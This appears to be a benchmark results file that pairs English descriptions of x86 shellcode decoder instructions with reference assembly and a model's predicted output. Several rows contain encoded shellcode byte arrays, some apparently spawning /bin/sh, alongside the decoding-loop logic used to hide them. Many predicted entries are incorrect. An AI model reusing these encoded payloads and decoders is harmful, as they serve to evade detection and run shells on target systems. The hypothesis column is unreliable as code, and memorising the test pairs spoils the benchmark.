idx,nl,gold,hyp
1,_start,_start :,"mov eax , 63"
2,define the _start label and jump short to the call_decoder,_start : \ n jmp call_decoder,_start : \ n jmp short call_decoder
11,define the _start label and jump short to stage,_start : \ n jmp short stage,_start : \ n jmp short var1
22,call decoder,call decoder,int 80h
28,define call_decoder and call decoder function,call_decoder : \ n call decoder,call_decoder : \ n call function_1
29,define the call_decoder label and call the decoder function,call_decoder : \ n call decoder,call_decoder : \ n call function_1
30,define call_decoder and call decoder,call_decoder : \ n call decoder,call_decoder : \ n call [ esp ]
31,"in the function call_decoder call the decoder routine and define shellcode as array of bytes 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87","call_decoder : \ n call decoder \ n shellcode : db 0xeb , 0x25 , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x1e , 0x80 , 0x3e , 0x07 , 0x7c , 0x05 , 0x80 , 0x2e , 0x07 , 0xeb , 0x11 , 0x31 , 0xdb , 0x31 , 0xd2 , 0xb3 , 0x07 , 0xb2 , 0xff , 0x66 , 0x42 , 0x2a , 0x1e , 0x66 , 0x29 , 0xda , 0x88 , 0x16 , 0x46 , 0xe2 , 0xe2 , 0xeb , 0x05 , 0xe8 , 0xd6 , 0xff , 0xff , 0xff , 0x38 , 0xc7 , 0x57 , 0x6f , 0x69 , 0x68 , 0x7a , 0x6f , 0x6f , 0x69 , 0x70 , 0x75 , 0x36 , 0x6f , 0x36 , 0x36 , 0x36 , 0x36 , 0x90 , 0xea , 0x57 , 0x90 , 0xe9 , 0x5a , 0x90 , 0xe8 , 0xb7 , 0x12 , 0xd4 , 0x87","call_decoder : \ n call [ decoder ] , 0xeb , 0x25 , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x1e , 0x80 , 0x3e , 0x07 , 0x7c , 0x05 , 0x80 , 0x2e , 0x07 , 0xeb , 0x11 , 0x31 , 0xdb , 0x31 , 0xd2 , 0xb3 , 0x07 , 0xb2 , 0xff , 0x66 , 0x42 , 0x2a , 0x1e , 0x66 , 0x29 , 0xda , 0x88 , 0x16 , 0x46 , 0xe2 , 0xe2 , 0xeb , 0x05 , 0xe8 , 0xd6 , 0xff , 0xff , 0xff , 0x38 , 0xc7 , 0x57 , 0x6f , 0x69 , 0x68 , 0x7a , 0x6f , 0x6f , 0x69 , 0x70 , 0x75 , 0x36 , 0x6f , 0x36 , 0x36 , 0x36 , 0x36 , 0x90 , 0xea , 0x57 , 0x90 , 0xe9 , 0x5a , 0x90 , 0xe8 , 0xb7 , 0x12 , 0xd4 , 0x87 \ n jmp var1"
32,call_shellcode function,call_shellcode :,call call_shellcode
33,call_shellcode routine,call_shellcode :,"mov call_shellcode , 65"
34,define the call_shellcode label and call the decoder function,call_shellcode : \ n call decoder,call_shellcode : \ n call function_1
35,define the call_shellcode function and call decoder,call_shellcode : \ n call decoder,call_shellcode : \ n call [ esp ]
36,define call_shellcode and call decoder function,call_shellcode : \ n call decoder,call_shellcode : \ n call function_1
37,in call_shellcode call the decoder function,call_shellcode : \ n call decoder,call_shellcode : \ n call [ esp ]
38,in call_shellcode execute the decoder routine,call_shellcode : \ n call decoder,call_shellcode : \ n call [ esp ]
40,jump short to decode if al is not equal to cl else jump to shellcode,"cmp al , cl \ n jnz short decode \ n jmp shellcode",jne short decode \ n jmp shellcode
41,jump to shellcode if bl is equal to 0xaa,"cmp bl , 0xaa \ n jz shellcode","cmp bl , 0xaa \ n je shellcode"
42,jump to xordecode if bl is equal to 0xbb else jump to notdecode,"cmp bl , 0xbb \ n jz xordecode \ n jmp notdecode","cmp bl , 0xbb \ n je xordecode \ n jmp notdecode"
43,jump to shellcode label if the byte in esi is equal to 0x88,"cmp byte [ esi ] , 0x88 \ n jz shellcode","cmp byte [ esi ] , 0x88 \ n je shellcode"
44,jump to not_equal if the current byte of the shellcode is not equal to bl,"cmp byte [ esi ] , bl \ n jne not_equal",jne bl
45,jump to execute_shellcode if the doubleword in esi+edx+5 is equal to edi,"cmp dword [ esi + edx + 5 ] , edi \ n jz execute_shellcode","cmp dword execute_shellcode , esi + edx + 5 \ n je edi"
48,decrement the al register and jump to shellcode if the result is zero,dec al \ n jz shellcode,dec al \ n jz var0
49,decrease ebx by 1,dec ebx,"sub ebx , 1"
50,decode_loop,decode_loop :,"mov eax , 63"
51,decode_pr function,decode_pr :,call decode_pr
53,function decode,decode :,code :
54,decode function,decode :,call decode
55,decode routine,decode :,"mov decode , 65"
57,in the decode function jump to lowbound label if the current byte of the shellcode is lower than 0x7 else subtract 0x7 from the byte of the shellcode and jump to common_commands,"decode : \ n cmp byte [ esi ] , 0x7 \ n jl lowbound \ n sub byte [ esi ] , 0x7 \ n jmp common_commands","decode : \ n cmp byte [ esi ] , lowbound \ n jl 0x7 \ n sub byte [ esi ] , 0x7 \ n jmp var3"
58,in decode move the current byte of the shellcode in the bl register,"decode : \ n mov bl , byte [ esi ]","mov byte [ bl ] , al"
60,define decode function and subtract 13 from the current byte of the shellcode,"decode : \ n sub byte [ esi ] , 13",decode : \ n not byte [ esi ]
65,decoder function,decoder :,call decoder
66,decoder routine,decoder :,"mov decoder , 65"
69,decoder's main,decoder :,decode :
71,define the decoder function and store the encoded shellcode pointer in the esi register,decoder : \ n pop esi,decoder : \ n call [ esp ]
73,in decoder save the shellcode in esi and move it to edi,"decoder : \ n pop esi \ n mov edi , esi","pop esi \ n mov edi , [ esi ]"
74,define enc function and call decoder,enc : \ n call decoder,enc : \ n call [ esp ]
75,"encoded_shellcode is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80","encoded_shellcode : db 0xc0 , 0x31 , 0x68 , 0x50 , 0x2f , 0x2f , 0x68 , 0x73 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80","encoded_shellcode : db 0xc0 , 0x31 , 0x68 , 0x50 , 0x2f , 0x2f , 0x68 , 0x73 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
76,"define encoded_shellcode as array of words 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539","encoded_shellcode : dw 0x545 , 0x4a3 , 0x583 , 0x5d3 , 0x541 , 0x541 , 0x439 , 0x5d3 , 0x5d3 , 0x541 , 0x5e7 , 0x5d5 , 0x5cf , 0x411 , 0x4eb , 0x443 , 0x509 , 0x48d , 0x423 , 0x539","encoded_shellcode : db 0x545 , 0x4a3 , 0x583 , 0x5d3 , 0x541 , 0x541 , 0x439 , 0x5d3 , 0x5d3 , 0x541 , 0x5e7 , 0x5d5 , 0x5cf , 0x411 , 0x4eb , 0x443 , 0x509 , 0x48d , 0x423 , 0x539"
77,"encoded is the array of bytes 0xaa,0x62,0xc0,0xaa,0xa0,0xaa,0xd0,0xaa,0x5e,0xaa,0x5e,0xaa,0xe6,0xaa,0xd0,0xaa,0xd0,0xaa,0x5e,0xaa,0xc4,0xaa,0xd2,0xaa,0xdc,0x89,0xe3,0xaa,0xa0,0x89,0xe2,0xaa,0xa6,0x89,0xe1,0xb0,0xaa,0x16,0xcd,0x80,0xbb","encoded : db 0xaa , 0x62 , 0xc0 , 0xaa , 0xa0 , 0xaa , 0xd0 , 0xaa , 0x5e , 0xaa , 0x5e , 0xaa , 0xe6 , 0xaa , 0xd0 , 0xaa , 0xd0 , 0xaa , 0x5e , 0xaa , 0xc4 , 0xaa , 0xd2 , 0xaa , 0xdc , 0x89 , 0xe3 , 0xaa , 0xa0 , 0x89 , 0xe2 , 0xaa , 0xa6 , 0x89 , 0xe1 , 0xb0 , 0xaa , 0x16 , 0xcd , 0x80 , 0xbb","pop 0xaa , 0x62 , 0xc0 , 0xaa , 0xa0 , 0xaa , 0xd0 , 0xaa , 0x5e , 0xaa , 0x5e , 0xaa , 0xe6 , 0xaa , 0xd0 , 0xaa , 0xd0 , 0xaa , 0x5e , 0xaa , 0xc4 , 0xaa , 0xd2 , 0xaa , 0xdc , 0x89 , 0xe3 , 0xaa , 0xa0 , 0x89 , 0xe2 , 0xaa , 0xa6 , 0x89 , 0xe1 , 0xb0 , 0xaa , 0x16 , 0xcd , 0x80 , 0xbb"
78,"define encoded as array of words 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539","encoded : dw 0x04 , 0x539 , 0x9d9 , 0x6c9 , 0xfc9 , 0xc49 , 0xc29 , 0x839 , 0xdf9 , 0xc49 , 0xc49 , 0x839 , 0x839 , 0xce9 , 0xc59 , 0x259 , 0x4f9 , 0xfc9 , 0x259 , 0x4e9 , 0xff9 , 0x259 , 0x4d9 , 0x1c9 , 0xa79 , 0x619 , 0x2c9 , 0x539","0x04 , 0x539 , 0x9d9 , 0x6c9 , 0xfc9 , 0xc49 , 0xc29 , 0x839 , 0xdf9 , 0xc49 , 0xc49 , 0x839 , 0x839 , 0xce9 , 0xc59 , 0x259 , 0x4f9 , 0xfc9 , 0x259 , 0x4e9 , 0xff9 , 0x259 , 0x4d9 , 0x1c9 , 0xa79 , 0x619 , 0x2c9 , 0x539 : db 0x04 , 0x539 , 0x9d9 , 0x6c9 , 0xfc9 , 0xc49 , 0xc29 , 0x839 , 0xdf9 , 0xc49 , 0xc49 , 0x839 , 0x839 , 0xce9 , 0xc59 , 0x259 , 0x4f9 , 0xfc9 , 0x259 , 0x4e9 , 0xff9 , 0x259 , 0x4d9 , 0x1c9 , 0xa79 , 0x619 , 0x2c9 , 0x539"
79,define the array of bytes encodedshellcode and initialize to \xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb,encodedshellcode : db \ xeb \ x1d \ x5e \ x8d \ x7e \ x01 \ x31 \ xc0 \ xb0 \ x01 \ x31 \ xdb \ x8a \ x1c \ x06 \ x80 \ xf3 \ xaa \ x75 \ x10 \ x8a \ x5c \ x06 \ x01 \ x88 \ x1f \ x47 \ x04 \ x02 \ xeb \ xed \ xe8 \ xde \ xff \ xff \ xff \ x31 \ xaa \ xc0 \ xaa \ x50 \ xaa \ x68 \ xaa \ x2f \ xaa \ x2f \ xaa \ x73 \ xaa \ x68 \ xaa \ x68 \ xaa \ x2f \ xaa \ x62 \ xaa \ x69 \ xaa \ x6e \ xaa \ x89 \ xaa \ xe3 \ xaa \ x50 \ xaa \ x89 \ xaa \ xe2 \ xaa \ x53 \ xaa \ x89 \ xaa \ xe1 \ xaa \ xb0 \ xaa \ x0b \ xaa \ xcd \ xaa \ x80 \ xaa \ xbb \ xbb,encodedshellcode : db ë ^  ~  1 À °  1 Û    ó ª u   \    G   ë í è Þ ÿ ÿ ÿ 1 ª À ª P ª h ª / ª / ª s ª h ª h ª / ª b ª i ª n ª  ª ã ª P ª  ª â ª S ª  ª á ª ° ª ª Í ª  ª » »
81,"encodedshellcode is the array of bytes 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe","encodedshellcode : db 0x43 , 0xed , 0x1d , 0xf4 , 0x40 , 0xfb , 0x6f , 0x7a , 0xa9 , 0xe , 0xb6 , 0xe , 0xbc , 0xc9 , 0xe3 , 0x7a , 0xaf , 0x7a , 0x78 , 0xe , 0xc5 , 0xda , 0x76 , 0x6a , 0x17 , 0x1a , 0x4e , 0x68 , 0x38 , 0xc2 , 0x99 , 0xfb , 0x35 , 0x68 , 0x84 , 0xd2 , 0xb3 , 0xcb , 0x7c , 0x68 , 0x78 , 0xe2 , 0x9a , 0xf5 , 0xe9 , 0x50 , 0xc0 , 0x24 , 0x91 , 0xf8 , 0xfe","encodedshellcode : db 0x43 , 0xed , 0x1d , 0xf4 , 0x40 , 0xfb , 0x6f , 0x7a , 0xa9 , 0xe , 0xb6 , 0xe , 0xbc , 0xc9 , 0xe3 , 0x7a , 0xaf , 0x7a , 0x78 , 0xe , 0xc5 , 0xda , 0x76 , 0x6a , 0x17 , 0x1a , 0x4e , 0x68 , 0x38 , 0xc2 , 0x99 , 0xfb , 0x35 , 0x68 , 0x84 , 0xd2 , 0xb3 , 0xcb , 0x7c , 0x68 , 0x78 , 0xe2 , 0x9a , 0xf5 , 0xe9 , 0x50 , 0xc0 , 0x24 , 0x91 , 0xf8 , 0xfe , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
84,"encoder_shellcode is the array of bytes 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa","encoder_shellcode : db 0x08 , 0x60 , 0x58 , 0xc8 , 0x39 , 0xb0 , 0xd8 , 0xc3 , 0x9f , 0x9f , 0xd1 , 0xb8 , 0xb3 , 0xfe , 0xb9 , 0x1e , 0x4e , 0xfd , 0x97 , 0x70 , 0x39 , 0xb0 , 0x6a , 0xdb , 0xb0 , 0xc4 , 0x09 , 0xcf , 0x74 , 0x25 , 0x76 , 0xe6 , 0xe6 , 0xe6 , 0xf6 , 0x90 , 0x90 , 0xaa , 0xaa","encoder_shellcode : db 0x08 , 0x60 , 0x58 , 0xc8 , 0x39 , 0xb0 , 0xd8 , 0xc3 , 0x9f , 0x9f , 0xd1 , 0xb8 , 0xb3 , 0xfe , 0xb9 , 0x1e , 0x4e , 0xfd , 0x97 , 0x70 , 0x39 , 0xb0 , 0x6a , 0xdb , 0xb0 , 0xc4 , 0x09 , 0xcf , 0x74 , 0x25 , 0x76 , 0xe6 , 0xe6 , 0xe6 , 0xf6 , 0x90 , 0x90 , 0xaa , 0xaa , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
89,get_shellcode_addr function,get_shellcode_addr :,call get_shellcode_addr
90,declare the global _start label,global _start :,global _start
91,global _start,global _start :,global _start
95,point to the next position in ecx,inc ecx,inc ecx \ n inc ecx
102,next byte in the encoded shellcode,inc esi,inc esi \ n inc esi
103,point to the next byte of the shellcode,inc esi,inc esi \ n inc esi
107,point to the next byte of the shellcode and jump short to decode,inc esi \ n jmp short decode,inc esi \ n jmp short var0
111,go to call_shellcode,jmp short call_shellcode,"mov call_shellcode , 18"
117,goto the decode_pr to decode the next bytes,jmp short decode_pr,goto : inc decode_pr \ n jmp short var2
120,jump short to main,jmp short main,jmp short setup
121,go to shellcode_section,jmp short shellcode_section,"mov shellcode_section , 18"
122,jump short to switch,jmp short switch,jmp short setup
123,if zero jump to decoded_shellcode,jz decoded_shellcode,jz short decoded_shellcode
124,load the address of edi+2 into edi,"lea edi , [ edi + 2 ]","lea edi + 2 , [ esi + 1 ]"
130,load the effective address of esi+2 into esi,"lea esi , [ esi + 2 ]","lea edi , [ esi + 2 ]"
132,decrease the counter and jump to decode if not zero,loop decode,loopnz decode
133,decrement the counter and jump to decode if not zero else jump to edx,loop decode \ n jmp edx,loop decrypt \ n jmp edx
134,decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the encodedshellcode label,loop decode \ n jmp encodedshellcode,loop encodedshellcode \ n jmp short decode
135,decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label,loop decode \ n jmp shellcode,loop var2 \ n jmp short shellcode
137,decrement the counter and jump to the decode label if it is not zero else jump short to the encodedshellcode label,loop decode \ n jmp short encodedshellcode,loop decrypt \ n jmp short decode
138,decrease the counter and jump to decode if not zero else jump short to shellcode,loop decode \ n jmp short shellcode,loopnz decode \ n jmp short shellcode
139,decrement the counter and if it is not zero go back at decode_loop and execute the cicle again else jump to encoded_shellcode,loop decode_loop \ n jmp short encoded_shellcode,loop encoded_shellcode \ n jmp cicle
141,main function,main :,call main
142,move al into the address pointed by edi,"mov [ edi ] , al","mov edi , al"
144,swap al value with next byte value in esi,"mov [ esi ] , al","xor al , esi"
145,move the byte in esi into al,"mov al , byte [ esi ]","mov al , byte esi"
146,load the byte pointed by esi in al,"mov al , byte [ esi ]","mov al , byte esi"
147,put the byte at the address esi+1+ebp into al,"mov al , byte [ esi + 1 + ebp ]","mov al , byte esi + 1 + ebp"
148,backup cl into al,"mov al , cl","mov cl , al"
149,move dl to al,"mov al , dl","mov dl , var0"
150,copy the contents of dl into al,"mov al , dl","mov dl , al"
152,mov the word at the address edi+1+ecx into ax,"mov ax , word [ edi + 1 + ecx ]","edi + 1 + ecx : ax , [ edi + 1 + ecx ]"
153,move the contents of bl into bh,"mov bh , bl","mov bl , bh"
154,save the byte in esi+edx+2 in bh,"mov bh , byte [ esi + edx + 2 ]","mov byte [ esi + edx + 2 ] , al"
155,move the current byte of the shellcode to the bl,"mov bl , [ esi ]","mov byte [ esi ] , bl"
164,save the byte in esi+edx+1 in bl,"mov bl , byte [ esi + edx + 1 ]",push byte esi + edx + 1 \ n pop bl
167,move the byte at the address esi+eax*1+0x1 into bl and move bl into the byte in edi,"mov bl , byte [ esi + eax * 1 + 0x1 ] \ n mov byte [ edi ] , bl","mov bl , esi + eax * 1 + 0x1 \ n mov byte [ edi ] , bl"
168,move the byte at the address in [esi+ecx+1] in bl and subtract 0x7 from bl,"mov bl , byte [ esi + ecx + 1 ] \ n sub bl , 0x7","mov esi + ecx + 1 , [ \ n sub byte [ bl ] , esi + ecx + 1"
171,move dl to the byte pointed by the contents of eax,"mov byte [ eax ] , dl","mov eax , dl"
172,put the value of bl to the position of edi,"mov byte [ edi ] , bl","mov edi , bl"
174,move bl into the byte in edi and perform xor operation with 0xdd,"mov byte [ edi ] , bl \ n xor byte [ edi ] , 0xdd","mov byte [ edi ] , 0xdd"
175,move bl into the byte at the address edx + eax,"mov byte [ edx + eax ] , bl","mov byte [ bl ] , al"
176,move dl into the byte in esi+1,"mov byte [ esi + 1 ] , dl","mov byte [ esi + 1 ] , al"
177,move bl into the byte defined by the address esi + eax,"mov byte [ esi + eax ] , bl","mov byte [ bl ] , al"
178,move dl into the byte in esi,"mov byte [ esi ] , dl","mov dl , byte esi"
179,move bl into the byte in esi+ecx,"mov byte [ esi + ecx ] , bl","mov byte [ bl ] , al"
180,move cl into the byte in esp+eax+1,"mov byte [ esp + eax + 1 ] , cl","mov [ var1 ] , esp + eax + 1"
181,move bh into the byte in esp+eax+2,"mov byte [ esp + eax + 2 ] , bh","mov byte [ esp + eax + 2 ] , al"
183,move ch into the byte in esp+eax,"mov byte [ esp + eax ] , ch","mov byte [ ch ] , al"
184,move bl into the byte in edx + eax,"mov byte [ edx + eax ] , bl","mov byte [ bl ] , al"
185,save the byte in esi+edx+4 in ch,"mov ch , byte [ esi + edx + 4 ]",push byte esi + edx + 4 \ n pop ch
186,move 10 into the first byte of the counter,"mov cl , 10","mov al , 10"
192,move the address of esi-1 into dl,"mov dl , [ esi - 1 ]","mov dl , esi - 1"
193,move the previous byte of the shellcode to dl,"mov dl , [ esi - 1 ]","mov dl , byte [ esi ]"
194,move the contents of dl into the next byte of the shellcode,"mov dl , [ esi + 1 ]",inc dl \ n inc esi
197,move the byte at address eax+1 to dl,"mov dl , byte [ eax + 1 ]","mov dl , byte eax + 1"
198,move the byte at address eax to dl,"mov dl , byte [ eax ]","mov dl , byte eax"
199,move the contents of the address esi+1 into dl,"mov dl , byte [ esi + 1 ]","mov dl , esi + 1"
200,move the byte at the address esi+edi+1 into dl,"mov dl , byte [ esi + edi + 1 ]","mov dl , byte esi + edi + 1"
205,move the pointer to the shellcode into edi,"mov edi , esi","mov edi , shellcode"
207,move ax into the word in edi,"mov word [ edi ] , ax","mov edi , word ax"
209,in next_cycle increment edi by one and jump short to formatting,next_cycle : \ n inc edi \ n jmp short formatting,next_cycle : inc edi \ n jmp short var2
210,not operation of current byte in esi,not byte [ esi ],"mov byte [ esi ] , 0"
212,notdecode function,notdecode :,call notdecode
219,push the encoded shellcode pointer to stack,push esi,push byte [ esi ]
220,push the stack onto esi and move the contents on edi,"push esi \ n mov edi , esi","push esi \ n mov edi , esp"
222,left rotate the shellcode by one,"rol byte [ esi ] , 0x1","rol byte [ var0 ] , 1"
223,right rotate bl by the contents of cl,"ror bl , cl","ror cl , bl"
224,right rotate the shellcode in esi by one,"ror byte [ esi ] , 0x1","ror esi , 1"
227,in shellcode_section go to decoder's main,shellcode_section \ n call decoder,shellcode_section : \ n jmp esp
230,"shellcode contains the bytes 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4","shellcode : db 0x31 , 0xc0 , 0x31 , 0xdb , 0x31 , 0xc9 , 0x31 , 0xd2 , 0xb2 , 0xa4 , 0xeb , 0x1f , 0x5e , 0x8d , 0x3e , 0x8a , 0x1c , 0x0f , 0x88 , 0xdf , 0x88 , 0xd0 , 0x30 , 0xd8 , 0x74 , 0x16 , 0x66 , 0x8b , 0x44 , 0x0f , 0x01 , 0x66 , 0x31 , 0xd8 , 0x66 , 0x89 , 0x07 , 0x41 , 0x8d , 0x7f , 0x02 , 0xeb , 0xe4 , 0xe8 , 0xdc , 0xff , 0xff , 0xff , 0x7d , 0x4c , 0xa6 , 0x09 , 0xfe , 0xea , 0xd8 , 0x8b , 0x9b , 0x0c , 0x5f , 0x66 , 0x30 , 0x32 , 0xb9 , 0x07 , 0xe6 , 0xb7 , 0x0f , 0x69 , 0xc2 , 0xab , 0x2b , 0xf0 , 0x3e , 0x60 , 0x6c , 0xea , 0x82 , 0xe8 , 0x63 , 0x63 , 0x72 , 0x68 , 0x34 , 0x02 , 0xeb , 0xfb , 0xba , 0xef , 0xbf , 0x66 , 0xf4 , 0x15 , 0x9e , 0xbb , 0xdd , 0xe3 , 0x73 , 0xbe , 0xf3 , 0xbb , 0x32 , 0xfa , 0xeb , 0xef , 0x58 , 0x20 , 0x24 , 0x90 , 0xe3 , 0x85 , 0x2e , 0x64 , 0xe4 , 0x27 , 0x59 , 0xe9 , 0x3f , 0xee , 0x23 , 0x6e , 0x63 , 0xf0 , 0x3a , 0x47 , 0x2d , 0x78 , 0x68 , 0x30 , 0xa5 , 0x66 , 0xe6 , 0x2f , 0x69 , 0x10 , 0x91 , 0xfa , 0x92 , 0xd5 , 0x3e , 0x11 , 0x4d , 0xf4 , 0x9c , 0x9c , 0x16 , 0x39 , 0x74 , 0xa0 , 0xc9 , 0xce , 0xd2 , 0x5b , 0x31 , 0x5c , 0x0c , 0x0f , 0xfb , 0x72 , 0x1a , 0xb6 , 0x06 , 0xbd , 0xd1 , 0x1c , 0x51 , 0xa4","pop 0x31 , 0xc0 , 0x31 , 0xdb , 0x31 , 0xc9 , 0x31 , 0xd2 , 0xb2 , 0xa4 , 0xeb , 0x1f , 0x5e , 0x8d , 0x3e , 0x8a , 0x1c , 0x0f , 0x88 , 0xdf , 0x88 , 0xd0 , 0x30 , 0xd8 , 0x74 , 0x16 , 0x66 , 0x8b , 0x44 , 0x0f , 0x01 , 0x66 , 0x31 , 0xd8 , 0x66 , 0x89 , 0x07 , 0x41 , 0x8d , 0x7f , 0x02 , 0xeb , 0xe4 , 0xe8 , 0xdc , 0xff , 0xff , 0xff , 0x7d , 0x4c , 0xa6 , 0x09 , 0xfe , 0xea , 0xd8 , 0x8b , 0x9b , 0x0c , 0x5f , 0x66 , 0x30 , 0x32 , 0xb9 , 0x07 , 0xe6 , 0xb7 , 0x0f , 0x69 , 0xc2 , 0xab , 0x2b , 0xf0 , 0x3e , 0x60 , 0x6c , 0xea , 0x82 , 0xe8 , 0x63 , 0x63 , 0x72 , 0x68 , 0x34 , 0x02 , 0xeb , 0xfb , 0xba , 0xef , 0xbf , 0x66 , 0xf4 , 0x15 , 0x9e , 0xbb , 0xdd , 0xe3 , 0x73 , 0xbe , 0xf3 , 0xbb , 0x32 , 0xfa , 0xeb , 0xef , 0x58 , 0x20 , 0x24 , 0x90 , 0xe3 , 0x85 , 0x2e , 0x64 , 0xe4 , 0x27 , 0x59 , 0xe9 , 0x3f , 0xee , 0x23 , 0x6e , 0x63 , 0xf0 , 0x3a , 0x47 , 0x2d , 0x78 , 0x68 , 0x30 , 0xa5 , 0x66 , 0xe6 , 0x2f , 0x69 , 0x10 , 0x91 , 0xfa , 0x92 , 0xd5 , 0x3e , 0x11 , 0x4d , 0xf4 , 0x9c , 0x9c , 0x16 , 0x39 , 0x74 , 0xa0 , 0xc9 , 0xce , 0xd2 , 0x5b , 0x31 , 0x5c , 0x0c , 0x0f , 0xfb , 0x72 , 0x1a , 0xb6 , 0x06 , 0xbd , 0xd1 , 0x1c , 0x51 , 0xa4"
231,"define the array of bytes shellcode 0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d","shellcode : db 0x3e , 0xcd , 0x5d , 0x96 , 0xef , 0x75 , 0x3c , 0x3c , 0x80 , 0x75 , 0x75 , 0x3c , 0x6f , 0x76 , 0x7b , 0x96 , 0xf0 , 0x5d , 0xbd , 0x18 , 0xda , 0x8d","0x3e , 0xcd , 0x5d , 0x96 , 0xef , 0x75 , 0x3c , 0x3c , 0x80 , 0x75 , 0x75 , 0x3c , 0x6f , 0x76 , 0x7b , 0x96 , 0xf0 , 0x5d , 0xbd , 0x18 , 0xda , 0x8d : db 0x3e , 0xcd , 0x5d , 0x96 , 0xef , 0x75 , 0x3c , 0x3c , 0x80 , 0x75 , 0x75 , 0x3c , 0x6f , 0x76 , 0x7b , 0x96 , 0xf0 , 0x5d , 0xbd , 0x18 , 0xda , 0x8d"
